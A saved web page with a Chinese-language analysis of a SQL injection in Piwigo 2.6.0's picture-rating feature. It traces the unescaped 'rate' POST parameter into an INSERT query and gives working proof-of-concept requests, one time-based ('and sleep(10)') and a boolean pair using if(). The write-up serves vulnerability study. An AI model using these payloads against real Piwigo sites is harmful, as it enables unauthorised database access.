
<!-- saved from url=(0033)http://192.168.1.4/Piwigo%202.htm -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:宋体;
	panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
	{font-family:宋体;
	panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
@font-face
	{font-family:"Segoe UI";
	panose-1:2 11 5 2 4 2 4 2 2 3;}
@font-face
	{font-family:"\@宋体";
	panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:10.0pt;
	margin-left:0cm;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
h1
	{margin-top:10.0pt;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:0cm;
	margin-bottom:.0001pt;
	font-size:15.0pt;
	font-family:"Calibri","sans-serif";
	color:#17365D;
	font-weight:bold;}
h2
	{margin-top:10.0pt;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:0cm;
	margin-bottom:.0001pt;
	font-size:13.0pt;
	font-family:"Calibri","sans-serif";
	color:#17365D;
	font-weight:bold;}
h3
	{margin-top:10.0pt;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:0cm;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";
	color:#17365D;
	font-weight:bold;}
h4
	{margin-top:10.0pt;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:0cm;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";
	color:#17365D;
	font-weight:normal;}
h5
	{margin-top:10.0pt;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:0cm;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";
	color:#17365D;
	font-weight:normal;
	font-style:italic;}
h6
	{margin-top:10.0pt;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:0cm;
	margin-bottom:.0001pt;
	font-size:10.0pt;
	font-family:"Calibri","sans-serif";
	color:#17365D;
	font-weight:bold;}
p
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:10.0pt;
	margin-left:0cm;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
p.MsoAcetate, li.MsoAcetate, div.MsoAcetate
	{mso-style-link:"批注框文本 Char";
	margin:0cm;
	margin-bottom:.0001pt;
	font-size:9.0pt;
	font-family:"Calibri","sans-serif";}
span.MsoPlaceholderText
	{color:gray;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:10.0pt;
	margin-left:36.0pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:10.0pt;
	margin-left:36.0pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
p.MsoQuote, li.MsoQuote, div.MsoQuote
	{margin-top:0cm;
	margin-right:36.0pt;
	margin-bottom:10.0pt;
	margin-left:36.0pt;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";
	color:black;}
p.Publishwithline, li.Publishwithline, div.Publishwithline
	{mso-style-name:"Publish with line";
	margin:0cm;
	margin-bottom:.0001pt;
	font-size:16.0pt;
	font-family:"Calibri","sans-serif";
	color:#17365D;
	font-weight:bold;}
p.PublishStatus, li.PublishStatus, div.PublishStatus
	{mso-style-name:"Publish Status";
	margin-top:6.0pt;
	margin-right:0cm;
	margin-bottom:2.0pt;
	margin-left:0cm;
	background:#FDEB9F;
	border:none;
	padding:0cm;
	font-size:9.0pt;
	font-family:"Calibri","sans-serif";}
p.PublishStatusAccessible, li.PublishStatusAccessible, div.PublishStatusAccessible
	{mso-style-name:PublishStatus_Accessible;
	margin-top:6.0pt;
	margin-right:0cm;
	margin-bottom:2.0pt;
	margin-left:0cm;
	border:none;
	padding:0cm;
	font-size:9.0pt;
	font-family:"Calibri","sans-serif";}
p.Account, li.Account, div.Account
	{mso-style-name:Account;
	margin:0cm;
	margin-bottom:.0001pt;
	font-size:9.0pt;
	font-family:"Segoe UI","sans-serif";
	color:#4F81BD;}
p.Categories, li.Categories, div.Categories
	{mso-style-name:Categories;
	margin:0cm;
	margin-bottom:.0001pt;
	font-size:9.0pt;
	font-family:"Segoe UI","sans-serif";
	color:#4F81BD;}
p.PadderBetweenTitleandProperties, li.PadderBetweenTitleandProperties, div.PadderBetweenTitleandProperties
	{mso-style-name:"Padder Between Title and Properties";
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:1.0pt;
	margin-left:0cm;
	font-size:1.0pt;
	font-family:"Calibri","sans-serif";}
p.PadderBetweenControlandBody, li.PadderBetweenControlandBody, div.PadderBetweenControlandBody
	{mso-style-name:"Padder Between Control and Body";
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:6.0pt;
	margin-left:0cm;
	font-size:1.0pt;
	font-family:"Calibri","sans-serif";}
p.underline, li.underline, div.underline
	{mso-style-name:underline;
	margin-top:2.0pt;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:0cm;
	margin-bottom:.0001pt;
	border:none;
	padding:0cm;
	font-size:1.0pt;
	font-family:"Calibri","sans-serif";}
span.Char
	{mso-style-name:"批注框文本 Char";
	mso-style-link:批注框文本;}
.MsoChpDefault
	{font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
.MsoPapDefault
	{margin-bottom:10.0pt;}
 /* Page Definitions */
 @page WordSection1
	{size:612.0pt 792.0pt;
	margin:72.0pt 90.0pt 72.0pt 90.0pt;}
div.WordSection1
	{page:WordSection1;}
-->
</style>

<style type="text/css"></style></head>

<body lang="ZH-CN">

<div class="WordSection1">

<p class="Publishwithline"><span lang="EN-US">Piwigo 2.6.0 SQL Injection </span><span style="font-family:宋体">分析</span></p>

<div style="border:none;border-bottom:solid #4F81BD 1.0pt;padding:0cm 0cm 2.0pt 0cm">

<p class="underline"><span lang="EN-US">&nbsp;</span></p>

</div>

<p class="PadderBetweenControlandBody"><span lang="EN-US">&nbsp;</span></p>

<p class="MsoNormal"><span lang="EN-US">http://packetstormsecurity.com/files/129088/piwigo260-sql.txt</span></p>

<p class="MsoNormal"><span style="font-family:宋体">安装好</span><span lang="EN-US">piwigo2.6.0</span><span style="font-family:宋体">之后，直接测试，发现不行，跳转到上传页面，在</span><span lang="EN-US">picture.php</span><span style="font-family:宋体">前几行插入了几个</span><span lang="EN-US">var_dump</span><span style="font-family:宋体">语句，发现程序并没有走到下面，所以先上传一张图片。再次测试时，发现是对图片的一个评分功能。</span> <span style="font-family:宋体">简单跟踪一下。</span></p>

<p class="MsoNormal"><span lang="EN-US">Poc</span><span style="font-family:宋体">如下，</span><span lang="EN-US">post</span><span style="font-family:宋体">请求</span></p>

<table class="MsoTableGrid" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none">
 <tbody><tr>
  <td width="568" valign="top" style="width:426.1pt;border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt">
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">http://target/piwigo260/picture.php?/1/category/1&amp;action=rate</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">rate=1 and sleep(10)</span></p>
  </td>
 </tr>
</tbody></table>

<p class="MsoNormal"><span style="font-family:宋体">查看</span><span lang="EN-US">/picture.php</span><span style="font-family:宋体">，直接搜索</span><span lang="EN-US">rate, </span><span style="font-family:宋体">在</span><span lang="EN-US">326</span><span style="font-family:宋体">行找到</span></p>

<table class="MsoTableGrid" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none">
 <tbody><tr>
  <td width="568" valign="top" style="width:426.1pt;border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt">
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp; case 'rate' :</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp; {</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  include_once(PHPWG_ROOT_PATH.'include/functions_rate.inc.php');</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  rate_picture($page['image_id'], $_POST['rate']);</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  redirect($url_self);</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp; }</span></p>
  </td>
 </tr>
</tbody></table>

<p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p>

<p class="MsoNormal"><span style="font-family:宋体">包含了另外一个文件，然后调用了</span><span lang="EN-US">rate_picture</span><span style="font-family:宋体">函数，并且直接传递的</span><span lang="EN-US">post</span><span style="font-family:宋体">参数。</span></p>

<p class="MsoNormal"><span style="font-family:宋体">查看</span><span lang="EN-US">/include/functions_rate.inc.php</span></p>

<table class="MsoTableGrid" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none">
 <tbody><tr>
  <td width="568" valign="top" style="width:426.1pt;border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt">
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">function rate_picture($image_id, $rate)</span></p>
  </td>
 </tr>
</tbody></table>

<p class="MsoNormal"><span style="font-family:宋体">搜索</span><span lang="EN-US">rate</span><span style="font-family:宋体">参数，对于中间不知道值的变量，我们使用</span><span lang="EN-US">var_dump($aaa);exit();</span><span style="font-family:宋体">来查看该值，</span></p>

<p class="MsoNormal"><span style="font-family:宋体">最终我们在</span><span lang="EN-US">119</span><span style="font-family:宋体">行，看到</span><span lang="EN-US">$rate</span><span style="font-family:宋体">拼接到注入语句中，</span></p>

<table class="MsoTableGrid" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none">
 <tbody><tr>
  <td width="568" valign="top" style="width:426.1pt;border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt">
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp; $query = '</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">INSERT</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp; INTO '.RATE_TABLE.'</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;
  (user_id,anonymous_id,element_id,rate,date)</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp; VALUES</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp; ('</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp; .$user['id'].','</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp;
  .'\''.$anonymous_id.'\','</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp; .$image_id.','</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp; .$rate</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp;&nbsp;&nbsp; .',NOW())</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">;';//var_dump($query);exit();</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">&nbsp; pwg_query($query);</span></p>
  </td>
 </tr>
</tbody></table>

<p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p>

<p class="MsoNormal"><span style="font-family:宋体">我们打印该查询语句</span></p>

<table class="MsoTableGrid" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none">
 <tbody><tr>
  <td width="568" valign="top" style="width:426.1pt;border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt">
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">INSERT INTO piwigo_rate
  (user_id,anonymous_id,element_id,rate,date) VALUES (2,'192.168.1',1,<span style="background:yellow">1 and sleep(10)</span>,NOW()) ;</span></p>
  </td>
 </tr>
</tbody></table>

<p class="MsoNormal"><span style="font-family:宋体">发现我们的语句已经插入到该查询中，</span><span lang="EN-US">insert</span><span style="font-family:宋体">注入。由于这里没有报错信息，不能使用报错注入的技巧，所有只能盲注了。</span></p>

<p class="MsoNormal"><span style="font-family:宋体">一种是像上面那样使用时间盲注，这种比较慢。另外一种会快一些，感兴趣的可以找一找有没有快一点的方法。</span></p>

<table class="MsoTableGrid" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none">
 <tbody><tr>
  <td width="568" valign="top" style="width:426.1pt;border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt">
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">http://target/piwigo260/picture.php?/1/category/1&amp;action=rate</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">rate=1%2b if(1=2,1,4)</span></p>
  </td>
 </tr>
 <tr>
  <td width="568" valign="top" style="width:426.1pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0cm 5.4pt 0cm 5.4pt">
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">http://target/piwigo260/picture.php?/1/category/1&amp;action=rate</span></p>
  <p class="MsoNormal" style="margin-bottom:0cm;margin-bottom:.0001pt"><span lang="EN-US" style="font-size:10.5pt">rate=1%2b if(1=1,1,4)</span></p>
  </td>
 </tr>
</tbody></table>

<p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p>

</div>




</body></html>